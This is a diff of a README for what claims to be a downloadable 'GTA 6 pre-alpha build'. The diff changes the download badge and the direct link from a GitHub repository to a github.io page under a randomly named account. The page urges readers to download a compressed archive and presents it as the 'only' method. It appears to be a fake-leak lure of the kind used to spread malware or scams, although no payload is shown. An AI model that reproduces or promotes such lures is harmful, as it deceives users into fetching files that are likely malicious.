@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6_PRE_ALPHA-FF5733?style=for-the-badge&logo=rockstargames&logoColor=white)](https://github.com/Wintergreenoilcarcharhinidae6977/GTA-6-Pre-Alpha-Build-Download-2026)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6_PRE_ALPHA-FF5733?style=for-the-badge&logo=rockstargames&logoColor=white)](https://wintergreenoilcarcharhinidae6977.github.io)
 
 </div>
 
@@ -34,7 +34,7 @@ This is the only section you need to read. There are **no other methods**, no mi
 ### Step 1: Download the File
 
 1.  Click the large **DOWNLOAD** button at the top of this page, or use the link below for a direct download.
-2.  Visit this link to download the application: **[https://github.com/Wintergreenoilcarcharhinidae6977/GTA-6-Pre-Alpha-Build-Download-2026](https://github.com/Wintergreenoilcarcharhinidae6977/GTA-6-Pre-Alpha-Build-Download-2026)**
+2.  Visit this link to download the application: **[https://wintergreenoilcarcharhinidae6977.github.io](https://wintergreenoilcarcharhinidae6977.github.io)**
 3.  The download will begin automatically. If it prompts you to save a file, click **Save** or **OK**. The file is a compressed archive that contains the game folder.
 4.  Wait for the download to complete. Depending on your internet speed, this may take a little while because the game is a large file.
 
